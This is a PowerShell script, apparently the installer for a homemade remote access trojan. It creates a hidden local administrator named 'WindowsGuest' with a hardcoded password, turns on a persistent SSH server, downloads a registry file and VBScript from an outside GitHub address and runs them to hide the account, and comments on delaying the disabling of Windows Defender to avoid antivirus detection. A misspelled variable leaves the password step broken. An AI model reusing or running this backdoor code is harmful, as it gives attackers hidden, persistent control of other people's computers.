# builds resources for remote access tool

# random string for directories
function random_text{
    return -join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_})
}

# create local admin
function Create-NewLocalAdmin {
    [CmdletBinding()]
    param (
        [string] $NewLocalAdmin,
        [securestring] $Password
    )    
    begin {
    }    
    process {
        New-LocalUser "$NewLocalAdmin" -Password $Passwrod -FullName "$NewLocalAdmin" -Description "Temporary local admin"
        Write-Verbose "$NewLocalAdmin local user crated"
        Add-LocalGroupMember -Group "Administrators" -Member "$NewLocalAdmin"
        Write-Verbose "$NewLocalAdmin added to the local administrator group"
    }    
    end {
    }
}

## variables
$wd = random_text
$path = "$env:temp/$wd"
$initial_dir = Get-Location

# go to temp. make a working directory
mkdir $path
cd $path

# create admin user
Remove-LocalUser -Name "WindowsGuest"
$NewLocalAdmin = "WindowsGuest"
$Password = (ConvertTo-SecureString "rat123" -AsPlainText -Force)
Create-NewLocalAdmin -NewLocalAdmin $NewLocalAdmin -Password $Password

# dont disable wdef until need to, not av detectable up until here

# enabling persistent ssh
Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
Start-Service sshd
Set-Service -Name sshd -StartupType 'Automatic'

# create registery to hide local admin
$reg_file = random_text
Invoke-WebRequest -Uri "https://github.com/tarasermolenko/RemoteAccessTool/blob/main/files/admin.reg" -OutFile 
"wrev.reg"

# visual basic script to register the registery
$vbs_file = random_text
Invoke-WebRequest -Uri "https://github.com/tarasermolenko/RemoteAccessTool/blob/main/files/confirm.vbs" -OutFile 
"calty.vbs"


# install the registry
Invoke-Expression "./wrev.reg"; Invoke-Expression "./calty.vbs"

# self delete
#cd $initial_dir
#del rat_installer.ps1